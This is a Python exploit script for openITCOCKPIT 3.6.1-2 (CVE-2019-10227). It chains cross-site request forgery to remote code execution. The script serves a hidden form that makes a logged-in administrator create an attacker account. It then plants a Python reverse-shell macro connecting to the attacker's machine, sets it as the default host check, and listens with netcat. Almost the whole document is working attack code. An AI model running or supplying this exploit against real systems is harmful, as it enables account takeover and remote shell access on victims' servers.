# Exploit Title: openITCOCKPIT 3.6.1-2 - CSRF 2 RCE
# Google Dork: N/A
# Date: 26-08-2019
# Exploit Author: Julian Rittweger
# Vendor Homepage: https://openitcockpit.io/
# Software Link: https://github.com/it-novum/openITCOCKPIT/releases/tag/openITCOCKPIT-3.6.1-2
# Fixed in: 3.7.1 | https://github.com/it-novum/openITCOCKPIT/releases
# Version: 3.6.1-2
# Tested on: Debian 9
# CVE : 2019-10227
# Exploit Requirements: pip3 install bs4 requests && apt install netcat

#!/usr/bin/env python
import requests, urllib3, os
import http.server, socketserver

from bs4 import BeautifulSoup as bs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
--
  openITCOCKPIT v.3.6.1-2
  [CSRF 2 RCE]
--
""")

# Setup values
RHOST = input('[x] Enter IP of remote machine: ')
LHOST = input('[x] Enter IP of local  machine: ')
RPORT = int(input('[x] Enter local port (back-connection): '))
LPORT = int(input('[x] Enter local port (payload-hosting): '))

print('[-] Generating CSRF form using the following credentials: "hacked@oicp.app - letmein1337" ..')

# Generate file which serves CSRF payload
pl = open('./index.html', 'w')
# Register HTTP server
handler = http.server.SimpleHTTPRequestHandler

csrf = """
<iframe style="display:none;" name="csrff"></iframe>
<form method="post" action="https://""" + RHOST + """/users/add" target="csrff" style="display:none;">
	<input type="text" name="_method" value="POST">
	<input type="text" name="data[User][Container][]" value="1">
	<input type="text" name="data[ContainerUserMembership][1]" value="2">
	<input type="text" name="data[User][usergroup_id]" value="1">
	<input type="text" name="data[User][status]" value="1">
	<input type="text" name="data[User][email]" value="hacked@oicp.app">
	<input type="text" name="data[User][firstname]" value="Mr">
	<input type="text" name="data[User][lastname]" value="Nice">
	<input type="text" name="data[User][new_password]" value="letmein1337">
	<input type="text" name="data[User][confirm_new_password]" value="letmein1337">
	<input type="submit">
</form>
<script>
	function Redirect() {
        window.location="https://""" + RHOST + """/login/logout";
    }

	document.forms[0].submit();
    setTimeout('Redirect()', 3000);
</script>
"""

pl.write(csrf)
pl.close()
httpd = socketserver.TCPServer(("", LPORT), handler)

# Start HTTP server, quit on keyboard interrupt
try:
	print('[!] Serving payload at port : ' + str(LPORT) + ', press STRG+C if you registered requests!')
	print('[!] Send this URL to a logged-in administrator: http://' + LHOST + ':' + str(LPORT))
	httpd.serve_forever()
except KeyboardInterrupt:
	httpd.socket.close()
	print('\n[-] Starting exploitation ..')

print('[-] Logging in ..')
# Proceed login with generated credentials
c = requests.post('https://' + RHOST + '/login/login', data={'_method' : 'POST', 'data[LoginUser][username]' : 'hacked@oicp.app', 'data[LoginUser][password]' : 'letmein1337'}, verify=False, allow_redirects=False).headers['Set-Cookie']
print('[!] Received cookie: ' + c.split(';')[0])
print('[-] Creating reverse-shell as macro ..')
# Insert a new macro identified as $USER99$
makro = {'_method' : 'POST', 'data[0][Macro][id]' : 1, 'data[0][Macro][name]' : '$USER1$', 'data[0][Macro][value]' : '/opt/openitc/nagios/libexec', 'data[0][Macro][description]' : 'default', 'data[0][Macro][password]' : 0, 'data[1][Macro][id]' : 2, 'data[1][Macro][name]' : '$USER99$', 'data[1][Macro][value]' : "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + LHOST + "\"," + str(RPORT) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", 'data[1][Macro][password]' : 1}
requests.post('https://' + RHOST + '/macros', data=makro, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})
print('[-] Inserting macro as command ..')
# Register a new command using the inserted macro
requests.post('https://' + RHOST + '/commands/add/_controller:commands/_action:hostchecks', data={'_method' : 'POST', 'data[Command][command_type]' : 2, 'data[Command][name]' : 'pwned', 'data[Command][command_line]' : '$USER99$'}, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})
h = bs(requests.get('https://' + RHOST + '/commands/hostchecks', verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]}).text, 'html.parser')
ids = []

# Fetch current commands by ID
for i in h.find_all('form', {'action': lambda x : x.startswith('/commands/delete')}):
	ids.append(i.get('action').split('/')[-1])

print('[!] ID of command identified as: ' + str(ids[-1]))
print('[-] Updating default host ..')

# Update host, using the new malicious "hostcheck" command
sett = {'_method':'POST','data[Host][id]':'1','data[Host][container_id]':'1','data[Host][shared_container]':'','data[Host][hosttemplate_id]':'1','data[Host][name]':'localhost','data[Host][description]':'default+host','data[Host][address]':'127.0.0.1','data[Host][Hostgroup]':'','data[Host][Parenthost]':'','data[Host][notes]':'','data[Host][host_url]':'','data[Host][priority]':'1','data[Host][tags]':'','data[Host][notify_period_id]':'1','data[Host][notification_interval]':'0','data[Host][notification_interval]':'0','data[Host][notify_on_recovery]':'0','data[Host][notify_on_recovery]':'1','data[Host][notify_on_down]':'0','data[Host][notify_on_unreachable]':'0','data[Host][notify_on_unreachable]':'1','data[Host][notify_on_flapping]':'0','data[Host][notify_on_downtime]':'0','data[Host][active_checks_enabled]':'0','data[Host][active_checks_enabled]':'1','data[Host][Contact]':'','data[Host][Contact][]':'1','data[Host][Contactgroup]':'','data[Host][command_id]':ids[-1],'data[Host][check_period_id]':'1','data[Host][max_check_attempts]':'3','data[Host][check_interval]':'120','data[Host][check_interval]':'120','data[Host][retry_interval]':'120','data[Host][retry_interval]':'120','data[Host][flap_detection_enabled]':'0','data[Host][flap_detection_on_up]':'0','data[Host][flap_detection_on_down]':'0', 'data[Host][flap_detection_on_unreachable]' : 0}
requests.post('https://' + RHOST + '/hosts/edit/1/_controller:hosts/_action:browser/_id:1/', data=sett, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})

# Refresh host configuration
print('[-] Refreshing host configuration ..')
requests.get('https://' + RHOST + '/exports/launchExport/0.json', verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]}, headers={'X-Requested-With' : 'XMLHttpRequest'})

print('[!] Done! Enjoy your shell (popup in approx. 30s): ')

# We did it!
os.system('nc -lvp ' + str(RPORT))